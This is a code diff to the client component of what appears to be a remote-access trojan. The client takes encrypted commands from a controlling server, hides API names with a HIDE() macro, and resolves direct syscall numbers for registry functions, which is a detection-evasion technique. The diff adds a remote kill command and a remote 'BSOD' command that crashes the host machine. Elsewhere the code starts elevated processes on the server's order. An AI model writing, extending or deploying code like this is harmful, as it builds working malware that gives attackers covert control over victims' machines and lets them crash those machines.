@@ -28,7 +28,7 @@ Client::Client() {
 }
 
 Client::~Client() {
-    this->Disconnect(); // disconnect incase the socket is still connected
+    this->Disconnect(false); // disconnect incase the socket is still connected
 
     CleanWSA();
     //m_ProcMgr.FreeUsedLibrary(std::string(HIDE("Ws2_32.dll")));
@@ -121,10 +121,13 @@ void Client::SetRemoteMachineGUID() {
     obj.Attributes = OBJ_CASE_INSENSITIVE;
 
     HANDLE key;
+    this->m_ProcMgr.GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtOpenKey"));
     SysNtOpenKey(&key, GENERIC_READ, &obj);
 
     char buffer[512];
     u_long size;
+
+    this->m_ProcMgr.GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtQueryValueKey"));
     SysNtQueryValueKey(key, &valueName, KeyValuePartialInformation, buffer, sizeof(buffer), &size);
     PKEY_VALUE_PARTIAL_INFORMATION pk = ( PKEY_VALUE_PARTIAL_INFORMATION ) buffer;
     std::wstring data = ( wchar_t* ) pk->Data;
@@ -192,10 +195,18 @@ BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) 
     case RemoteAction::kPingClient:
         success = TRUE;
         break;
+    case RemoteAction::kKillClient:
+        this->Disconnect(true);
+        success = TRUE;
+        break;
+    case RemoteAction::kRemoteBSOD:
+        this->Disconnect(false);
+        this->m_ProcMgr.BSOD();
+        break;
     case RemoteAction::kOpenRemoteProcess:
         CLIENT_DBG("opening elevated process");
 
-        STARTUPINFO            si = {};
+        STARTUPINFO         si = {};
         PROCESS_INFORMATION pi = {};
 
         CLIENT_DBG(std::string(description.application.begin(), description.application.end()).c_str());
@@ -246,7 +257,8 @@ Packet Client::OnEncryptedPacket(BYTESTRING encrypted) {
 
 void Client::ListenForServerCommands() {
     BOOL received = FALSE;
-    while ( TRUE ) {
+    BOOLEAN state = FALSE;
+    while ( this->m_TCPSocket != INVALID_SOCKET ) {
         BYTESTRING encrypted;
 
         received = m_NetworkManager.ReceiveData(
@@ -263,16 +275,17 @@ void Client::ListenForServerCommands() {
         if ( receivedPacket.action == kKeepAlive ) {
             // echo keep alive
             CLIENT_DBG("echo keep alive!");
-            Sleep(100);
             m_NetworkManager.TransmitData(receivedPacket, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
             continue;
         }
 
-        if ( receivedPacket.flags & PACKET_IS_A_COMMAND )
+        if ( receivedPacket.flags & PACKET_IS_A_COMMAND ) {
+            CLIENT_DBG("IS cmd");
             PerformCommand(receivedPacket, responseToServer);
+        }
 
         // dont need to respond to server with 'responseToServer'
-        if ( ( receivedPacket.flags & RESPOND_WITH_STATUS ) == 0 )
+        if ( ( receivedPacket.flags & RESPOND_WITH_STATUS ) == FALSE )
             continue;
 
         // respond to server with 'responseToServer'
@@ -368,14 +381,15 @@ bool Client::SendMessageToServer(Server& dest, ClientMessage message) {
     return false;
 }
 
-bool Client::Disconnect() {
-    ClientRequest disconnectRequest(ClientRequest::kDisconnectClient);
-    MakeTCPRequest(disconnectRequest, TRUE);
+bool Client::Disconnect(bool forceQuit) {
+    // server doesn't know were disconncting
+    if ( !forceQuit ) {
+        ClientRequest disconnectRequest(ClientRequest::kDisconnectClient);
+        MakeTCPRequest(disconnectRequest, TRUE);
+    }
 
     CloseSocket(this->m_UDPSocket);
-    int status = CloseSocket(this->m_TCPSocket);
-    if ( status == SOCKET_ERROR )
-        return false;
+    CloseSocket(this->m_TCPSocket);
 
     this->m_UDPSocket = INVALID_SOCKET;
     this->m_TCPSocket = INVALID_SOCKET;
